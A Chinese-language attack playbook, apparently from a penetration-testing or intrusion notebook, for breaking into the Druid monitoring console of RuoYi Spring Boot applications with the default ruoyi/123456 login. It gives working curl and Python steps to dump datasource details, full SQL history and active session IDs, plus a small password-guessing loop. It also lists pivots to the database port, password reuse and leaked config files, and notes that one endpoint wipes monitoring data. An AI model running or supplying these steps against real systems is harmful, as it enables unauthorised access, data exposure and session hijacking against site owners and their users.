# 若依 RuoYi Druid 监控台默认口令 → 数据源 + 全量 SQL 读取

## 适用面 / 前提

- 目标为若依（RuoYi / RuoYi-Vue 系）Spring Boot 应用，版本见 v3.8.x 一类前端 `app_version` 或 `/prod-api/` 前缀、`若依` 版权信息。
- 关键前提（两点同时成立才可打）：
  1. Druid `StatViewServlet` 仍在 `application-druid.yml` 中启用，访问路径为 `<context-path>/druid/`（常见 `<context-path>` = `prod-api` / 站点短名，如 `mmjd`）。若依 `SecurityConfig` 默认 `.antMatchers("/druid/**").anonymous()`，所以**框架本身不拦监控台，唯一的门就是 Druid 自己的登录框**。
  2. `stat-view-servlet` 保留了框架默认 `login-username: ruoyi` / `login-password: 123456`（很多部署照抄不改）。
- 无需任何账号、无需前台登录；本动作只读，低噪声。

## 步骤

### 0. 定位监控台（不要只猜 /druid/）

上下文路径写错会拿到 404 或 SPA 兜底页。从首页资源、`/prod-api/` 前缀、错误页里的 context-path 反推，再拼 `<ctx>/druid/login.html`。

```bash
BASE=https://TARGET/mmjd        # 换成实际 <host>/<context-path>

curl -sk "$BASE/druid/login.html" | grep -Ei 'title|loginUsername|submitLogin'
```

判据：HTTP 200，`<title>druid monitor</title>`，表单字段 `loginUsername` / `loginPassword`，提交端点相对路径 `submitLogin`。

旁证（可选）：`curl -sk "$BASE/druid/index.html" -i | head -5` → 302 Location 精确指向同站 `/druid/login.html`（ResourceServlet 标准鉴权跳转）。

### 1. 默认口令登录（必须配 cookie jar）

```bash
curl -sk -c cj.txt -D - -o body.txt \
  -X POST "$BASE/druid/submitLogin" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'loginUsername=ruoyi&loginPassword=123456'
```

- 成功：HTTP 200，响应 body 就 7 个字节 `success`，并回 `Set-Cookie: JSESSIONID=<sid>`。
- 失败：body `error`。
- 判据以 **body 语义**为准，别看状态码——Druid 成功失败都是 200。

### 2. 读数据源（库类型 / jdbc url / 库名 / 库账号）

```bash
curl -sk -b cj.txt "$BASE/druid/datasource.json" -o datasource.json   # 期望 200 + ResultCode:1
python - <<'PY'
import json
d=json.load(open('datasource.json'))
for c in d.get('Content',[]):
    print(c.get('DbType'), c.get('DriverClassName'), c.get('URL'), c.get('UserName'))
PY
```

典型回显：`mysql com.mysql.cj.jdbc.Driver jdbc:mysql://localhost:3306/ry-vue?useUnicode=true&characterEncoding=utf8  ry-vue`。

注意：**Druid 的 datasource.json 默认不回 Password 字段**，只给 jdbc url + 库账号，不要以为拿到了口令。后续价值在于：库名/账号确定后 → 试 3306（若对外开放）、试同账号口令复用、找配置泄露（`/prod-api/...`、actuator/env、备份包）里同名的 `password`。

### 3. 读全量 SQL 历史与业务表名

```bash
curl -sk -b cj.txt "$BASE/druid/sql.json" -o sql.json
python - <<'PY'
import json,re
d=json.load(open('sql.json'))
tabs=set()
for r in d.get('Content',[]):
    s=r.get('SQL') or ''
    tabs |= set(re.findall(r'(?:from|join|into|update|delete\s+from)\s+`?([A-Za-z0-9_]+)`?', s, re.I))
print(len(d.get('Content',[])),'条 SQL;',len(tabs),'张表')
print('\n'.join(sorted(tabs)))
PY
```

sql.json 常见几百 KB，含建表/增删改查原文（包括 `sys_user`、`sys_role` 等敏感表与业务表结构线索），据表名与列名即可规划取数路径。一并值得拉：`websession.json`（活跃会话 sessionId，同域可尝试会话复用）、`weburi.json`、`basic.json`、`wall.json`。

### 4. 阴性对照（判断"是口令弱"还是"路径/会话问题"）

对不同的会话各打一条错口令：

```bash
for p in 'admin&loginPassword=123456' 'ruoYi&loginPassword=123456' 'ruoYi&loginPassword=ruoYi' 'druid&loginPassword=druid'; do
  printf '%-32s ' "$p"; curl -sk -X POST "$BASE/druid/submitLogin" --data "loginUsername=$p" ; echo
done
```

本目标实测这 4 组**全部回 `error`**，说明账号固定为 `ruoyi`，不是任意弱口令通吃，也排除了"submitLogin 一律回 success"的假命中。

## 失败原因清单

| 现象 | 原因 |
|---|---|
| login.html 404 / 返回 SPA HTML | 上下文路径猜错，需重新定位 `<context-path>` |
| login.html 200 但无 loginUsername 字段 | 不是 Druid（同形路径），或已被摘除 |
| submitLogin 回 error | 口令已改；换 ruoyi/ruoyi、druid/druid、ruoyi/admin123 小字典（无频控） |
| submitLogin success 但 datasource.json 302 回 login.html | 没带 `-b cj.txt`，或没带 `-c` 存 cookie，或 Set-Cookie 未回传 |
| datasource.json 为空 Content | Druid 已 `resetEnable` / 数据源被监控清除，可先 `reset-all.json` 后重新触发业务再读 |
| json 端点 401/403 JSON（RuoYi `code:401`） | 该路径被 Spring Security 改成了 authenticated，需前台账号 |

## 注意

- 这个口子的定位是**侦察跳板**而非终点：库口令要另找，Druid 只给 url + 账号。
- 生产上 Druid 会话可能被别人顶掉，一次会话内把需要的 json 全抓完再分析。
- `reset-all.json` 会清监控数据，属写操作，如非必要放最后。
